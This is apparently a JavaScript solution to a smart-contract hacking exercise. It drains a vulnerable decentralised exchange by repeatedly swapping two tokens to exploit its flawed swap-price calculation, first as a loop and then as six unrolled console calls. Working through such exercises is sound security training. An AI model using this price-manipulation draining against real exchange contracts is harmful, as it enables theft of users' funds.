
await contract.approve(contract.address, web3.utils.encodePacked(-1));
const tokens = [await contract.token1(), await contract.token2()];

// if I could do a loop like that in the devtools console,
// it would look like this:

while (await contract.balanceOf(tokens[0], contract.address) > 0 || await contract.balanceOf(tokens[1], contract.address) > 0) {
    const toBalance = await contract.balanceOf(tokens[1], contract.address);
    const maxSwap = await contract.get_swap_price(tokens[0], tokens[1], await contract.balanceOf(tokens[0], player));
    
    const amount = (toBalance > maxSwap)? await contract.balanceOf(tokens[0], player) : await contract.balanceOf(tokens[0], contract.address);
    
    await contract.swap(tokens[0], tokens[1], amount);
    
    tokens.reverse();
}

// in the devtools console:

const amount = async () => {
    const toBalance = await contract.balanceOf(tokens[1], contract.address);
    const maxSwap = await contract.get_swap_price(tokens[0], tokens[1], await contract.balanceOf(tokens[0], player));
    return (toBalance > maxSwap)? await contract.balanceOf(tokens[0], player) : await contract.balanceOf(tokens[0], contract.address);
}

await contract.swap(tokens[0], tokens[1], await amount());
tokens.reverse();
await contract.swap(tokens[0], tokens[1], await amount());
tokens.reverse();
await contract.swap(tokens[0], tokens[1], await amount());
tokens.reverse();
await contract.swap(tokens[0], tokens[1], await amount());
tokens.reverse();
await contract.swap(tokens[0], tokens[1], await amount());
tokens.reverse();
await contract.swap(tokens[0], tokens[1], await amount());
